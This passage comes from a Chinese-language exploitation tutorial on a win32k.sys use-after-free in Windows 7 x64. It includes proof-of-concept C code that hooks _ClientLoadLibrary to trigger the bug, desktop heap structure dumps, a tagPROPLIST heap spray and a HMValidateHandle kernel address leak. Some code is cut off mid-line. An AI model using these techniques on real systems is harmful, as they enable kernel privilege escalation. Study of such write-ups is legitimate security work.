        if (!VirtualProtect((LPVOID)_ClientLoadLibrary_addr, 0x1000, PAGE_READWRITE, &dwOldProtect))
            return FALSE;
        *(ULONG_PTR*)_ClientLoadLibrary_addr = (ULONG_PTR)Fake_ClientLoadLibrary;
        if (!VirtualProtect((LPVOID)_ClientLoadLibrary_addr, 0x1000, dwOldProtect, &dwOldProtect))
            return FALSE;
        return TRUE;
    }
其中hook函数我们只需要销毁窗口即可
    VOID Fake_ClientLoadLibrary()
    {
        if (hookflag)
        {
            if (++hookcount == 2) // 保证执行一次
            {
                hookflag = 0;
                DestroyWindow(hWnd);
            }
        }
    }
这样我们就构造了一个可以触发蓝屏的Poc，其中还需要注意的是，这里的hookflag和hookcount的目的只有一个，就是为了让DestroyWindow只执行一次，下面是导致蓝屏的过程图
我们现在只能构造一个蓝屏的Poc，我们要利用这个漏洞，还得知道这个蓝屏能带来什么
## 漏洞利用
###  桌面堆
想要了解这个漏洞的其他细节，我们得继续分析回调函数后面的代码，我们祭出IDA，继续分析回调函数后面的流程，我们发现这里其实存在一次对结构体的写入
在伪代码中显示如下
可能下面的那句话有点绕，这里我解释一下这句话啥意思，我们来看一下下面代码的例子你就懂了，其实就是判断 **?** 前面的值是否为真，若为真则返回 **:**
左边的值，假就返回右边的值
所以我们这里的漏洞代码就可能修改到 *
psbInfo的值，也就是说我们达到一定条件可以改写结构体的内容，因为是修改tagWND中的结构，其关联的一些知识点就会涉及一些桌面堆的知识，所以我先给一些桌面堆的paper供大家参考，当然你不参考也可以继续往下看，我会尽量解释清楚
  * Tarjei Mandt 师傅的论文：
  * 小刀师傅对菜单管理的博客(主要看堆中菜单的管理和泄露地址部分)： 
  * Windows 8 堆管理(主要看堆头部分就行)：
  * ntdebug 师傅分析桌面堆结构：
  * leviathansecurity 对堆头的介绍：
简言之 win32k.sys 就是通过桌面堆来存储与给定桌面相关的 GUI
对象，包括窗口对象及其相关结构，如属性列表(tagPROPLIST)、窗口文本(_LARGE_UNICODE_STRING)、菜单(tagMENU)等，首先我们看几个涉及到的结构体，结构都取自Windows
7
x64，第一个就是当我们调用CreateWindow函数创建窗口的时候，会生成一个tagWND结构，大小是0x128，这个结构很大，我们只需要关注几个关键成员，也就是下图标注了颜色的几个结构
下面依次介绍这几个结构：
**tagSBINFO**
大小 0x24，加上堆头 0x2c ，这也是我们 UAF 的对象
    2: kd> dt -v win32k!tagSBINFO -r
    struct tagSBINFO, 3 elements, 0x24 bytes
       +0x000 WSBflags         : Int4B
       +0x004 Horz             : struct tagSBDATA, 4 elements, 0x10 bytes // 水平
          +0x000 posMin           : Int4B
          +0x004 posMax           : Int4B
          +0x008 page             : Int4B
          +0x00c pos              : Int4B
       +0x014 Vert             : struct tagSBDATA, 4 elements, 0x10 bytes // 垂直
          +0x000 posMin           : Int4B
          +0x004 posMax           : Int4B
          +0x008 page             : Int4B
          +0x00c pos              : Int4B
**tagPROPLIST**
大小 0x18，加上堆头0x20，由`SetPropA`函数创建
    2: kd> dt -v win32k!tagPROPLIST -r
    struct tagPROPLIST, 3 elements, 0x18 bytes
       +0x000 cEntries         : Uint4B  // 表示aprop数组的大小
       +0x004 iFirstFree       : Uint4B  // 表示当前正在添加第几个tagPROP
       +0x008 aprop            : [1] struct tagPROP, 3 elements, 0x10 bytes // 一个单项的tagProp
          +0x000 hData            : Ptr64 to Void // 对应hData
          +0x008 atomKey          : Uint2B // 对应lpString
          +0x00a fs               : Uint2B // 无法控制
下面介绍一下 SetPropA
这个函数，这个函数用来设置tagPROPLIST结构，若该属性已经设置过，则直接修改其数据，若未设置过，则在数组中添加一个条目；若添加条目时发现，cEntries和iFirstFree相等，则表示props数组已满，此时会重新分配堆空间，并将原来的数据复制进去。如果我们利用UAF增大了cEntries的值，在数组已满的情况下，再次调用
SetPropA 函数，就会导致缓冲区溢出，后面我们就是利用这里造成进一步的利用
    BOOL SetPropA(
      HWND   hWnd,
      LPCSTR lpString,
      HANDLE hData
    );
**_LARGE_UNICODE_STRING**
大小 0x10，加上堆头 0x18，由`RtlInitLargeUnicodeString`函数可以初始化Buffer，
`NtUserDefSetText`可以设置 tagWND 的 strName 字段，此函数可以做到桌面堆大小的任意分配
    2: kd> dt -v win32k!_LARGE_UNICODE_STRING -r
    struct _LARGE_UNICODE_STRING, 4 elements, 0x10 bytes
       +0x000 Length           : Uint4B
       +0x004 MaximumLength    : Bitfield Pos 0, 31 Bits
       +0x004 bAnsi            : Bitfield Pos 31, 1 Bit
       +0x008 Buffer           : Ptr64 to Uint2B
**tagMENU**
大小 0x98，加上堆头 0xa0，由CreateMenu()创建，可用来填补一些内存，并且后面还可以用来任意地址读写
    2: kd> dt -v win32k!tagMENU
    struct tagMENU, 19 elements, 0x98 bytes
       +0x000 head             : struct _PROCDESKHEAD, 5 elements, 0x28 bytes
       +0x028 fFlags           : Uint4B
       +0x02c iItem            : Int4B
       +0x030 cAlloced         : Uint4B
       +0x034 cItems           : Uint4B
       +0x038 cxMenu           : Uint4B
       +0x03c cyMenu           : Uint4B
       +0x040 cxTextAlign      : Uint4B
       +0x048 spwndNotify      : Ptr64 to struct tagWND, 170 elements, 0x128 bytes
       +0x050 rgItems          : Ptr64 to struct tagITEM, 20 elements, 0x90 bytes
       +0x058 pParentMenus     : Ptr64 to struct tagMENULIST, 2 elements, 0x10 bytes
       +0x060 dwContextHelpId  : Uint4B
       +0x064 cyMax            : Uint4B
       +0x068 dwMenuData       : Uint8B
       +0x070 hbrBack          : Ptr64 to struct HBRUSH__, 1 elements, 0x4 bytes
       +0x078 iTop             : Int4B
       +0x07c iMaxTop          : Int4B
       +0x080 dwArrowsOn       : Bitfield Pos 0, 2 Bits
       +0x084 umpm             : struct tagUAHMENUPOPUPMETRICS, 2 elements, 0x14 bytes
###  初始化阶段
因为我们Poc里面是销毁的tagWND窗口，为了查看uaf之后改变了什么，我们这里初始化很多的tagWND，并且设置tagPROPLIST，64位的
tagSBINFO 大小是 0x28 ，而一个 tagPROPLIST 大小为0x18，当再增加一个 tagPROP 的时候，其大小刚好为 (0x18 +
0x10) == 0x28，也就是说我们刚好可以占用释放的那块 tagSBINFO ，那也就可以监视 UAF 前后内存的变化，下面是窗口堆初始化函数实现
    BOOL InitWindow(HWND* hwndArray,int count)
    {
        WNDCLASSEXA wn;
        wn.cbSize = sizeof(WNDCLASSEX);
        wn.style = 0;
        wn.lpfnWndProc = WndProc;
        wn.cbClsExtra = 0;
        wn.cbWndExtra = 0;
        wn.hInstance = GetModuleHandleA(NULL);
        wn.hIcon = LoadIcon(NULL, IDI_APPLICATION);
        wn.hCursor = LoadCursor(NULL, IDC_ARROW);
        wn.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
        wn.lpszMenuName = NULL;
        wn.lpszClassName = sz_ClassName;
        wn.hIconSm = LoadIcon(NULL, IDI_APPLICATION);
        if (regflag)
        {
            if (!RegisterClassExA(&wn))
            {
                cout pSelf; // 这里赋值一下再打印是为了防止VS编译器的优化
    printf("[+] spray_step_one[0] address is : 0x%pn", addr);
实现函数如下， 我们在 user32 中寻找 HMValidateHandle 函数, 该函数在 IsMenu
函数中有被调用，所以可以通过硬编码比较的方式获取 HMValidateHandle 的地址，然而这个函数有一个 pSelf 指针，可以泄露内核地址
    extern "C" lHMValidateHandle pHmValidateHandle = NULL;
    BOOL FindHMValidateHandle() {
        HMODULE hUser32 = LoadLibraryA("user32.dll");
        if (hUser32 == NULL) {
            printf("[*] Failed to load user32n");
            return FALSE;
        }
        BYTE* pIsMenu = (BYTE*)GetProcAddress(hUser32, "IsMenu");
        if (pIsMenu == NULL) {
            printf("[*] Failed to find location of exported function 'IsMenu' within user32.dlln");
            return FALSE;
        }
        unsigned int uiHMValidateHandleOffset = 0;
        for (unsigned int i = 0; i  dt -v win32k!tagPROP
    struct tagPROP, 3 elements, 0x10 bytes
       +0x000 hData            : Ptr64 to Void // 8字节可控
       +0x008 atomKey          : Uint2B // 2字节大概可控
       +0x00a fs               : Uint2B // 无法控制